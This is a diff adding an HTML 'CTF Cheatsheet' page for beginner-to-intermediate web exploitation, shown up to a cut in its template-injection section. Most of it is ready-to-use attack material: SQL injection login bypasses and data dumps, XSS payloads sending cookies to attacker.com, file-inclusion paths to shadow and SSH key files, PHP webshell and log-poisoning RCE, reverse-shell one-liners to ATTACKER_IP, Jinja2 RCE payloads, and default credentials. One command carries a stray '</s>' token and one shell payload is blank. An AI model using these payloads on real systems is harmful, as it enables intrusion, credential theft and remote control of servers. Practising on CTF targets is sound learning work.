@@ -1,0 +1,1494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CTF Cheatsheet — Beginner to Intermediate</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --surface2: #1c2333;
+    --border: #30363d;
+    --green: #3fb950;
+    --cyan: #79c0ff;
+    --yellow: #e3b341;
+    --red: #f85149;
+    --purple: #d2a8ff;
+    --orange: #ffa657;
+    --pink: #ff79c6;
+    --text: #e6edf3;
+    --muted: #8b949e;
+    --code-bg: #0d1117;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    font-size: 13px;
+    line-height: 1.6;
+    scroll-behavior: smooth;
+  }
+
+  /* COVER PAGE */
+  .cover {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: linear-gradient(135deg, #0d1117 0%, #1a1f2e 50%, #0d1117 100%);
+    border-bottom: 2px solid var(--green);
+    page-break-after: always;
+    text-align: center;
+    padding: 60px 40px;
+  }
+  .cover-title {
+    font-size: 52px;
+    font-weight: 900;
+    letter-spacing: -1px;
+    background: linear-gradient(90deg, #3fb950, #79c0ff, #d2a8ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    line-height: 1.1;
+    margin-bottom: 16px;
+  }
+  .cover-sub {
+    font-size: 20px;
+    color: var(--muted);
+    margin-bottom: 8px;
+  }
+  .cover-tags {
+    display: flex;
+    gap: 12px;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin-top: 28px;
+  }
+  .tag {
+    padding: 6px 16px;
+    border-radius: 20px;
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+  .tag-web { background: rgba(63,185,80,.15); color: var(--green); border: 1px solid var(--green); }
+  .tag-crypto { background: rgba(210,168,255,.15); color: var(--purple); border: 1px solid var(--purple); }
+  .tag-forensics { background: rgba(121,192,255,.15); color: var(--cyan); border: 1px solid var(--cyan); }
+  .tag-misc { background: rgba(255,166,87,.15); color: var(--orange); border: 1px solid var(--orange); }
+  .cover-note {
+    margin-top: 40px;
+    font-size: 13px;
+    color: var(--muted);
+    border: 1px solid var(--border);
+    padding: 12px 24px;
+    border-radius: 8px;
+    background: var(--surface);
+  }
+
+  /* LAYOUT */
+  .container {
+    max-width: 1400px;
+    margin: 0 auto;
+    padding: 0 24px 60px;
+  }
+
+  /* TOC */
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 32px;
+    margin: 32px 0;
+    page-break-after: always;
+  }
+  .toc h2 {
+    color: var(--cyan);
+    font-size: 24px;
+    margin-bottom: 20px;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 10px;
+  }
+  .toc-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 20px;
+  }
+  .toc-section h3 {
+    font-size: 13px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 8px;
+  }
+  .toc-section h3 a { color: inherit; text-decoration: none; }
+  .toc-section h3 a:hover { color: var(--green); }
+  .toc-section ul { list-style: none; padding-left: 12px; }
+  .toc-section li { color: var(--muted); font-size: 12px; padding: 2px 0; }
+  .toc-section li::before { content: "→ "; color: var(--green); }
+  .toc-section li a { color: inherit; text-decoration: none; transition: color 0.2s; }
+  .toc-section li a:hover { color: var(--text); text-decoration: underline; }
+
+  /* CHAPTER HEADERS */
+  .chapter {
+    margin: 48px 0 24px;
+    page-break-before: always;
+  }
+  .chapter-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 20px 28px;
+    border-radius: 12px;
+    margin-bottom: 24px;
+  }
+  .chapter-web { background: linear-gradient(135deg, rgba(63,185,80,.12), rgba(63,185,80,.04)); border-left: 4px solid var(--green); }
+  .chapter-crypto { background: linear-gradient(135deg, rgba(210,168,255,.12), rgba(210,168,255,.04)); border-left: 4px solid var(--purple); }
+  .chapter-forensics { background: linear-gradient(135deg, rgba(121,192,255,.12), rgba(121,192,255,.04)); border-left: 4px solid var(--cyan); }
+  .chapter-misc { background: linear-gradient(135deg, rgba(255,166,87,.12), rgba(255,166,87,.04)); border-left: 4px solid var(--orange); }
+  .chapter-icon { font-size: 36px; }
+  .chapter-title { font-size: 30px; font-weight: 800; }
+  .chapter-desc { color: var(--muted); font-size: 14px; }
+
+  /* SECTION */
+  .section {
+    margin: 28px 0;
+  }
+  .section-title {
+    font-size: 18px;
+    font-weight: 700;
+    color: var(--yellow);
+    margin-bottom: 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .section-title::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+    margin-left: 8px;
+  }
+
+  /* SUBSECTION */
+  .subsection {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 18px 20px;
+    margin: 14px 0;
+  }
+  .subsection-title {
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--cyan);
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  /* CODE BLOCKS */
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px 16px;
+    overflow-x: auto;
+    margin: 10px 0;
+    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+    font-size: 12px;
+    line-height: 1.7;
+  }
+  code {
+    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+    font-size: 12px;
+    background: var(--surface2);
+    padding: 2px 6px;
+    border-radius: 4px;
+    color: var(--orange);
+  }
+  pre code {
+    background: none;
+    padding: 0;
+    color: var(--text);
+  }
+
+  /* SYNTAX HIGHLIGHTING (manual) */
+  .kw { color: #ff79c6; }
+  .fn { color: #79c0ff; }
+  .str { color: #a5d6ff; }
+  .cm { color: #6e7681; font-style: italic; }
+  .num { color: #ffa657; }
+  .var { color: #e3b341; }
+
+  /* GRID LAYOUTS */
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px; }
+  @media (max-width: 900px) {
+    .grid-2, .grid-3 { grid-template-columns: 1fr; }
+  }
+
+  /* TABLES */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+    margin: 10px 0;
+  }
+  th {
+    background: var(--surface2);
+    color: var(--cyan);
+    padding: 8px 12px;
+    text-align: left;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    border-bottom: 1px solid var(--border);
+  }
+  td {
+    padding: 7px 12px;
+    border-bottom: 1px solid rgba(48,54,61,0.5);
+    vertical-align: top;
+  }
+  tr:hover td { background: var(--surface2); }
+
+  /* BADGES */
+  .badge {
+    display: inline-block;
+    padding: 2px 8px;
+    border-radius: 10px;
+    font-size: 10px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .badge-easy { background: rgba(63,185,80,.2); color: var(--green); }
+  .badge-medium { background: rgba(227,179,65,.2); color: var(--yellow); }
+  .badge-hard { background: rgba(248,81,73,.2); color: var(--red); }
+  .badge-tip { background: rgba(121,192,255,.2); color: var(--cyan); }
+  .badge-warn { background: rgba(255,166,87,.2); color: var(--orange); }
+
+  /* ALERTS */
+  .alert {
+    padding: 12px 16px;
+    border-radius: 8px;
+    margin: 10px 0;
+    font-size: 12px;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+  }
+  .alert-tip { background: rgba(63,185,80,.08); border-left: 3px solid var(--green); }
+  .alert-warn { background: rgba(255,166,87,.08); border-left: 3px solid var(--orange); }
+  .alert-info { background: rgba(121,192,255,.08); border-left: 3px solid var(--cyan); }
+  .alert-danger { background: rgba(248,81,73,.08); border-left: 3px solid var(--red); }
+
+  /* PAYLOAD BLOCK */
+  .payload-block {
+    background: #0a0e14;
+    border: 1px solid rgba(248,81,73,.3);
+    border-left: 3px solid var(--red);
+    border-radius: 8px;
+    padding: 12px 16px;
+    margin: 8px 0;
+    font-family: 'Consolas', monospace;
+    font-size: 12px;
+    color: #ff9999;
+  }
+  .payload-block .label {
+    font-size: 10px;
+    color: var(--red);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+    font-weight: 700;
+  }
+
+  /* QUICK REF CARDS */
+  .qcard {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px;
+  }
+  .qcard h4 {
+    color: var(--pink);
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 8px;
+  }
+  .qcard ul { list-style: none; }
+  .qcard li {
+    padding: 2px 0;
+    font-size: 11.5px;
+    color: var(--muted);
+  }
+  .qcard li span { color: var(--text); font-family: monospace; }
+
+  /* STEP LIST */
+  .steps { counter-reset: step; }
+  .step {
+    display: flex;
+    gap: 12px;
+    margin: 8px 0;
+    align-items: flex-start;
+  }
+  .step-num {
+    min-width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: var(--green);
+    color: #000;
+    font-size: 11px;
+    font-weight: 900;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+  .step-content { font-size: 12.5px; }
+
+  /* DIVIDER */
+  .divider {
+    height: 1px;
+    background: var(--border);
+    margin: 24px 0;
+  }
+
+  /* PRINT */
+  @media print {
+    body { font-size: 10px; background: white; color: black; }
+    .cover { page-break-after: always; min-height: auto; }
+    pre { white-space: pre-wrap; word-break: break-all; }
+    .chapter { page-break-before: always; }
+  }
+</style>
+</head>
+<body>
+
+<div class="cover">
+  <div class="cover-title">CTF CHEATSHEET</div>
+  <div class="cover-sub">Beginner → Intermediate | Print & Conquer</div>
+  <div style="color: var(--muted); font-size:13px; margin-top:8px;">Web · Cryptography · Forensics · Miscellaneous</div>
+  <div class="cover-tags">
+    <span class="tag tag-web">🌐 Web Exploitation</span>
+    <span class="tag tag-crypto">🔐 Cryptography</span>
+    <span class="tag tag-forensics">🔍 Forensics</span>
+    <span class="tag tag-misc">⚡ Miscellaneous</span>
+  </div>
+  <div class="cover-note">
+    ⚡ Packed with payloads, one-liners, tools, and techniques. <br>
+    Ctrl+F is your best friend. Flag format: <code>CTF{...}</code> or <code>flag{...}</code>
+  </div>
+</div>
+
+<div class="container">
+
+<div class="toc">
+  <h2>📋 Table of Contents</h2>
+  <div class="toc-grid">
+    <div class="toc-section">
+      <h3 style="color:var(--green)"><a href="#chapter-web">🌐 Web</a></h3>
+      <ul>
+        <li><a href="#section-recon">Recon & Info Gathering</a></li>
+        <li><a href="#section-sqli">SQL Injection (SQLi)</a></li>
+        <li><a href="#section-xss">Cross-Site Scripting (XSS)</a></li>
+        <li><a href="#section-lfi">Local/Remote File Inclusion</a></li>
+        <li><a href="#section-cmd">Command Injection</a></li>
+        <li><a href="#section-idor">IDOR & Broken Access Control</a></li>
+        <li><a href="#section-ssrf">SSRF</a></li>
+        <li><a href="#section-xxe">XXE Injection</a></li>
+        <li><a href="#section-ssti">SSTI (Template Injection)</a></li>
+        <li><a href="#section-auth">Authentication Bypass</a></li>
+        <li><a href="#section-jwt">JWT Attacks</a></li>
+        <li><a href="#section-dir">Directory Traversal</a></li>
+        <li><a href="#section-csrf">CSRF</a></li>
+        <li><a href="#section-deserial">Deserialization</a></li>
+        <li><a href="#section-redirect">Open Redirect</a></li>
+        <li><a href="#section-headers">HTTP Header Tricks</a></li>
+      </ul>
+    </div>
+    <div class="toc-section">
+      <h3 style="color:var(--purple)"><a href="#chapter-crypto">🔐 Cryptography</a></h3>
+      <ul>
+        <li><a href="#section-enc-enc">Encoding vs Encryption</a></li>
+        <li><a href="#section-classical">Classical Ciphers</a></li>
+        <li><a href="#section-xor">XOR Cipher</a></li>
+        <li><a href="#section-rsa">RSA Attacks</a></li>
+        <li><a href="#section-aes">AES/Block Cipher Attacks</a></li>
+        <li><a href="#section-hash">Hash Cracking</a></li>
+        <li><a href="#section-base">Base Encoding Family</a></li>
+        <li><a href="#section-freq">Frequency Analysis</a></li>
+        <li><a href="#section-vigenere">Vigenère Cipher</a></li>
+        <li><a href="#section-py-crypto">Python Crypto Toolkit</a></li>
+        <li><a href="#section-cyberchef">CyberChef Recipes</a></li>
+        <li><a href="#section-crypto-patterns">Common CTF Crypto Patterns</a></li>
+      </ul>
+    </div>
+    <div class="toc-section">
+      <h3 style="color:var(--cyan)"><a href="#chapter-forensics">🔍 Forensics</a></h3>
+      <ul>
+        <li><a href="#section-file-basics">File Analysis Basics</a></li>
+        <li><a href="#section-stego">Steganography</a></li>
+        <li><a href="#section-img-forensics">Image Forensics</a></li>
+        <li><a href="#section-audio">Audio Steganography</a></li>
+        <li><a href="#section-pcap">PCAP / Network Analysis</a></li>
+        <li><a href="#section-disk">Disk & Memory Forensics</a></li>
+        <li><a href="#section-metadata">Metadata Extraction</a></li>
+        <li><a href="#section-archive">Archive & Compressed Files</a></li>
+        <li><a href="#section-pdf">PDF/Office Forensics</a></li>
+        <li><a href="#section-logs">Log Analysis</a></li>
+      </ul>
+    </div>
+    <div class="toc-section">
+      <h3 style="color:var(--orange)"><a href="#chapter-misc">⚡ Miscellaneous</a></h3>
+      <ul>
+        <li><a href="#section-linux">Linux Essentials</a></li>
+        <li><a href="#section-py-scripts">Python Quick Scripts</a></li>
+        <li><a href="#section-rev">Reverse Engineering Basics</a></li>
+        <li><a href="#section-bases">Binary / Number Bases</a></li>
+        <li><a href="#section-regex">Regex Tricks</a></li>
+        <li><a href="#section-git">Git Forensics</a></li>
+        <li><a href="#section-docker">Docker CTF Tips</a></li>
+        <li><a href="#section-osint">OSINT Techniques</a></li>
+        <li><a href="#section-strategy">General CTF Strategy</a></li>
+        <li><a href="#section-online-tools">Online Tools Reference</a></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="chapter" id="chapter-web">
+  <div class="chapter-header chapter-web">
+    <span class="chapter-icon">🌐</span>
+    <div>
+      <div class="chapter-title" style="color:var(--green)">WEB EXPLOITATION</div>
+      <div class="chapter-desc">SQL Injection · XSS · LFI/RFI · Command Injection · SSTI · Auth Bypass · JWT · SSRF · XXE</div>
+    </div>
+  </div>
+
+  <div class="section" id="section-recon">
+    <div class="section-title">🕵️ Recon & Information Gathering</div>
+
+    <div class="subsection">
+      <div class="subsection-title">First Things First — Enumerate Everything</div>
+      <pre>
+<span class="cm"># View page source & find hidden comments</span>
+Ctrl+U  or  view-source:http://target.com
+
+<span class="cm"># robots.txt — always check</span>
+http://target.com/robots.txt
+
+<span class="cm"># .htaccess, .git, .env, config files</span>
+http://target.com/.git/
+http://target.com/.env
+http://target.com/config.php
+http://target.com/backup.zip
+http://target.com/admin/
+
+<span class="cm"># Common hidden paths wordlist (ffuf / gobuster)</span>
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50
+gobuster dir -u http://target.com -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+<span class="cm"># Subdomain enumeration</span>
+ffuf -u http://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com"
+gobuster vhost -u http://target.com -w subdomains.txt
+
+<span class="cm"># Check HTTP response headers</span>
+curl -I http://target.com
+curl -v http://target.com 2>&1 | grep -E "^[<>]"
+
+<span class="cm"># Nikto scanner</span>
+nikto -h http://target.com
+
+<span class="cm"># wfuzz for parameter fuzzing</span>
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://target.com/FUZZ</pre>
+      <div class="grid-2">
+        <div class="qcard">
+          <h4>💡 Hidden Files to Check</h4>
+          <ul>
+            <li><span>/.git/HEAD</span> — Source code</li>
+            <li><span>/.svn/entries</span> — SVN repo</li>
+            <li><span>/.env</span> — Credentials</li>
+            <li><span>/backup.sql</span> — DB dump</li>
+            <li><span>/phpinfo.php</span> — PHP config</li>
+            <li><span>/server-status</span> — Apache status</li>
+            <li><span>/api/swagger.json</span> — API docs</li>
+            <li><span>/crossdomain.xml</span> — Flash policy</li>
+            <li><span>/sitemap.xml</span> — URL list</li>
+          </ul>
+        </div>
+        <div class="qcard">
+          <h4>🔑 Default Credentials</h4>
+          <ul>
+            <li><span>admin:admin</span></li>
+            <li><span>admin:password</span></li>
+            <li><span>admin:123456</span></li>
+            <li><span>root:root</span></li>
+            <li><span>admin:admin123</span></li>
+            <li><span>guest:guest</span></li>
+            <li><span>test:test</span></li>
+            <li><span>administrator:administrator</span></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section" id="section-sqli">
+    <div class="section-title">💉 SQL Injection (SQLi)</div>
+
+    <div class="subsection">
+      <div class="subsection-title">Detection — Does it Bleed?</div>
+      <div class="payload-block">
+        <div class="label">🔥 Detection Payloads</div>
+'<br>''<br>')<br>"<br>`<br>') -- -<br>1' AND '1'='1<br>1' AND '1'='2<br>1 AND 1=1<br>1 AND 1=2<br>1' ORDER BY 1--<br>1' ORDER BY 100--  (increase until error)
+      </div>
+    </div>
+
+    <div class="subsection">
+      <div class="subsection-title">Union-Based SQLi (MySQL)</div>
+      <div class="payload-block">
+        <div class="label">Step 1 — Find column count</div>
+1' ORDER BY 1--<br>1' ORDER BY 2--<br>1' ORDER BY 3--   &larr; error here = 2 columns
+      </div>
+      <div class="payload-block">
+        <div class="label">Step 2 — Find printable column</div>
+1' UNION SELECT NULL,NULL--<br>1' UNION SELECT 'a',NULL--<br>1' UNION SELECT NULL,'a'--
+      </div>
+      <div class="payload-block">
+        <div class="label">Step 3 — Extract data</div>
+' UNION SELECT 1,database()--<br>' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--<br>' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--<br>' UNION SELECT 1,group_concat(username,':',password) FROM users--
+      </div>
+      <pre>
+<span class="cm"># URL-encoded space tricks</span>
+%20  /**/  +  %09  %0a
+
+<span class="cm"># Comment styles</span>
+-- -       (MySQL / MSSQL)
+#          (MySQL)
+/**/       (universal)
+/*!50000*/  (MySQL version-specific)</pre>
+    </div>
+
+    <div class="subsection">
+      <div class="subsection-title">Blind SQLi (Boolean & Time-Based)</div>
+      <div class="payload-block">
+        <div class="label">Boolean-Based</div>
+1' AND SUBSTRING(database(),1,1)='a'--<br>1' AND SUBSTRING(database(),1,1)>'m'--<br>1' AND (SELECT COUNT(*) FROM users)>0--
+      </div>
+      <div class="payload-block">
+        <div class="label">Time-Based (MySQL)</div>
+1' AND SLEEP(5)--<br>1'; WAITFOR DELAY '0:0:5'--  (MSSQL)<br>1' AND 1=(SELECT 1 FROM pg_sleep(5))--  (PostgreSQL)<br>1' AND IF(1=1,SLEEP(5),0)--
+      </div>
+    </div>
+
+    <div class="subsection">
+      <div class="subsection-title">SQLMap — The Lazy Way</div>
+      <pre>
+<span class="cm"># Basic scan</span>
+sqlmap -u "http://target.com/page?id=1" --batch
+
+<span class="cm"># With cookies (logged-in)</span>
+sqlmap -u "http://target.com/page?id=1" --cookie="session=abcd" --batch
+
+<span class="cm"># POST request</span>
+sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch
+
+<span class="cm"># Dump everything</span>
+sqlmap -u "http://target.com/?id=1" --dbs --batch
+sqlmap -u "http://target.com/?id=1" -D dbname --tables --batch
+sqlmap -u "http://target.com/?id=1" -D dbname -T users --dump --batch
+
+<span class="cm"># Use request file (from Burp)</span>
+sqlmap -r request.txt --level=5 --risk=3 --batch
+
+<span class="cm"># Bypass WAF</span>
+sqlmap -u "..." --tamper=space2comment,between,randomcase --batch</pre>
+    </div>
+
+    <div class="subsection">
+      <div class="subsection-title">Auth Bypass via SQLi</div>
+      <div class="payload-block">
+        <div class="label">Classic Login Bypass (Username field)</div>
+admin'--<br>admin' #<br>' OR 1=1--<br>' OR '1'='1<br>') OR ('1'='1<br>admin'/*<br>a' OR 1=1 LIMIT 1;--
+      </div>
+    </div>
+
+    <div class="subsection">
+      <div class="subsection-title">Read Files / Write Shells (MySQL)</div>
+      <pre>
+<span class="cm"># Read file (needs FILE privilege)</span>
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
+' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL--
+
+<span class="cm"># Write PHP shell (needs write permission)</span>
+' UNION SELECT "" INTO OUTFILE '/var/www/html/shell.php'--
+
+<span class="cm"># Then access: http://target.com/shell.php?cmd=id</span></pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-xss">
+    <div class="section-title">🔥 Cross-Site Scripting (XSS)</div>
+
+    <div class="subsection">
+      <div class="subsection-title">Basic XSS Payloads</div>
+      <div class="payload-block">
+        <div class="label">Detection & Basic</div>
+&lt;script&gt;alert(1)&lt;/script&gt;<br>&lt;script&gt;alert('XSS')&lt;/script&gt;<br>&lt;img src=x onerror=alert(1)&gt;<br>&lt;svg onload=alert(1)&gt;<br>&lt;body onload=alert(1)&gt;<br>&lt;iframe src="javascript:alert(1)"&gt;<br>javascript:alert(1)
+      </div>
+      <div class="payload-block">
+        <div class="label">Filter Bypass</div>
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;<br>&lt;script&gt;alert`1`&lt;/script&gt;<br>&lt;img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)"&gt;<br>&lt;svg/onload=alert(1)&gt;<br>&lt;details open ontoggle=alert(1)&gt;<br>&lt;input autofocus onfocus=alert(1)&gt;<br>'" --&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br>&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;
+      </div>
+    </div>
+
+    <div class="subsection">
+      <div class="subsection-title">Cookie Stealing Payloads</div>
+      <div class="payload-block">
+        <div class="label">Cookie Exfiltration</div>
+&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;<br>&lt;script&gt;fetch('http://attacker.com/?c='+btoa(document.cookie))&lt;/script&gt;<br>&lt;img src="http://attacker.com/log.php?c="+document.cookie&gt;<br>&lt;script&gt;new Image().src='http://attacker.com/?'+document.cookie&lt;/script&gt;
+      </div>
+      <div class="alert alert-tip">
+        <span>💡</span>
+        <span>Use <strong>webhook.site</strong> or <strong>requestbin.com</strong> to receive stolen cookies in CTF. For flags in cookies, look for <code>document.cookie</code>.</span>
+      </div>
+    </div>
+
+    <div class="subsection">
+      <div class="subsection-title">XSS in Different Contexts</div>
+      <pre>
+<span class="cm"># Attribute context (inside tag attribute)</span>
+" onmouseover="alert(1)
+" autofocus onfocus="alert(1)
+"><img src=x onerror=alert(1)>
+
+<span class="cm"># JavaScript context (inside script tag)</span>
+';alert(1)//
+\';alert(1)//
+</script><script>alert(1)
+
+<span class="cm"># href/src context</span>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+
+<span class="cm"># Inside JSON</span>
+{"name":"</script><script>alert(1)</script>"}</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-lfi">
+    <div class="section-title">📂 Local File Inclusion (LFI) & RFI</div>
+
+    <div class="subsection">
+      <div class="subsection-title">LFI Payloads</div>
+      <div class="payload-block">
+        <div class="label">Basic LFI (URL param: ?page=, ?file=, ?include=)</div>
+?page=../../../etc/passwd<br>?page=....//....//....//etc/passwd<br>?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd<br>?page=..%2F..%2F..%2Fetc%2Fpasswd<br>?page=....\/....\/etc/passwd<br>?page=/etc/passwd%00  (null byte — old PHP)<br>?page=php://filter/convert.base64-encode/resource=index.php<br>?page=php://filter/read=string.rot13/resource=index.php
+      </div>
+      <div class="grid-2">
+        <div class="qcard">
+          <h4>📁 Files to Read (Linux)</h4>
+          <ul>
+            <li><span>/etc/passwd</span></li>
+            <li><span>/etc/shadow</span></li>
+            <li><span>/etc/hosts</span></li>
+            <li><span>/proc/self/environ</span></li>
+            <li><span>/proc/self/cmdline</span></li>
+            <li><span>/var/log/apache2/access.log</span></li>
+            <li><span>/var/log/auth.log</span></li>
+            <li><span>/home/user/.ssh/id_rsa</span></li>
+            <li><span>/var/www/html/config.php</span></li>
+            <li><span>/var/www/html/.env</span></li>
+          </ul>
+        </div>
+        <div class="qcard">
+          <h4>📁 Files to Read (Windows)</h4>
+          <ul>
+            <li><span>C:\Windows\win.ini</span></li>
+            <li><span>C:\Windows\System32\drivers\etc\hosts</span></li>
+            <li><span>C:\boot.ini</span></li>
+            <li><span>C:\inetpub\wwwroot\web.config</span></li>
+            <li><span>C:\xampp\apache\conf\httpd.conf</span></li>
+            <li><span>..\..\..\..\Windows\win.ini</span></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="subsection">
+      <div class="subsection-title">PHP Wrappers (CTF Gold)</div>
+      <pre>
+<span class="cm"># Base64 encode source code (most useful!)</span>
+?page=php://filter/convert.base64-encode/resource=config.php
+<span class="cm"># Decode: echo "BASE64STRING" | base64 -d</span>
+
+<span class="cm"># Chain filters</span>
+?page=php://filter/zlib.deflate|convert.base64-encode/resource=index.php
+
+<span class="cm"># Input stream (RCE if allow_url_include=on)</span>
+?page=php://input
+<span class="cm"># POST body: &lt;?php system($_GET['cmd']); ?&gt;</span>
+
+<span class="cm"># Data URI RCE</span>
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+<span class="cm"># Decoded: &lt;?php system($_GET['cmd']); ?&gt;</span>
+
+<span class="cm"># Expect wrapper</span>
+?page=expect://id</pre>
+    </div>
+
+    <div class="subsection">
+      <div class="subsection-title">Log Poisoning → RCE</div>
+      <pre>
+<span class="cm"># Step 1: Inject PHP into User-Agent via curl</span>
+curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://target.com
+
+<span class="cm"># Step 2: Include the log file</span>
+?page=../../../var/log/apache2/access.log&cmd=id
+?page=../../../var/log/nginx/access.log&cmd=whoami
+
+<span class="cm"># Other injectable logs</span>
+/proc/self/environ (inject via User-Agent)
+/var/mail/www-data (inject via email to server)</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-cmd">
+    <div class="section-title">⚡ Command Injection</div>
+
+    <div class="subsection">
+      <div class="subsection-title">Command Injection Payloads</div>
+      <div class="payload-block">
+        <div class="label">Separators & Chaining</div>
+; id<br>| id<br>|| id<br>&amp;&amp; id<br>`id`<br>$(id)<br>%0a id<br>%0d%0a id<br>; cat /etc/passwd<br>| cat /flag.txt
+      </div>
+      <div class="payload-block">
+        <div class="label">Filter Bypass</div>
+c$()at /etc/passwd<br>cat$IFS/etc/passwd<br>cat${IFS}/etc/passwd<br>c'a't /etc/passwd<br>ca\t /etc/passwd<br>/???/??t /etc/passwd  (glob: matches /bin/cat)<br>$(tr '[A-Z]' '[a-z]' &lt;&lt;&lt;'CAT') /etc/passwd
+      </div>
+      <pre>
+<span class="cm"># Space bypass</span>
+{cat,/etc/passwd}
+cat</s>/etc/passwd        # tab character
+cat%09/etc/passwd        # URL encoded tab
+X=$'cat\x20/etc/passwd';$X
+
+<span class="cm"># Reading without cat</span>
+less /etc/passwd
+more /etc/passwd
+head /etc/passwd
+tail /etc/passwd
+strings /etc/passwd
+grep "" /etc/passwd
+curl file:///etc/passwd
+
+<span class="cm"># Reverse shell one-liners (nc listener: nc -lvnp 4444)</span>
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+nc -e /bin/sh ATTACKER_IP 4444
+php -r '$sock=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-ssti">
+    <div class="section-title">🧩 Server-Side Template Injection (SSTI)</div>
+
+    <div class="subsection">
+      <div class="subsection-title">Detection & Identification</div>
+      <div class="payload-block">
+        <div class="label">Detection Probes (inject in user inputs, URL params)</div>
+{{7*7}}  → 49 means Jinja2/Twig<br>${7*7}  → 49 means Freemarker/Velocity<br>#{7*7}  → 49 means Ruby ERB<br>&lt;%=7*7%&gt;  → 49 means EJS/ERB<br>{{7*'7'}}  → 7777777 = Jinja2 | 49 = Twig
+      </div>
+
+      <table>
+        <tr><th>Result</th><th>Engine</th><th>Language</th></tr>
+        <tr><td>49</td><td>Jinja2 / Twig / Smarty</td><td>Python / PHP</td></tr>
+        <tr><td>7777777</td><td>Jinja2</td><td>Python</td></tr>
+        <tr><td>${7*7} displayed</td><td>Not vulnerable / wrong syntax</td><td>—</td></tr>
+        <tr><td>49 with #{}</td><td>Freemarker</td><td>Java</td></tr>
+      </table>
+    </div>
+
+    <div class="subsection">
+      <div class="subsection-title">Jinja2 RCE (Python/Flask) — Most Common in CTFs</div>
+      <div class="payload-block">
+        <div class="label">RCE Payloads</div>
+{{config}}<br>{{config.items()}}<br>{{''.__class__.__mro__[1].__subclasses__()}}<br><br>{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}<br><br>{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}<br><br>{{''.__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /flag').read()}}
+      </div>
+      <pre>
+<span class="cm"># Jinja2 filter bypass</span>
+{{''.join(['__','class','__'])|attr('__mro__')}}
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")}}
+
+<span class="cm"># Find index of subprocess.Popen class</span>
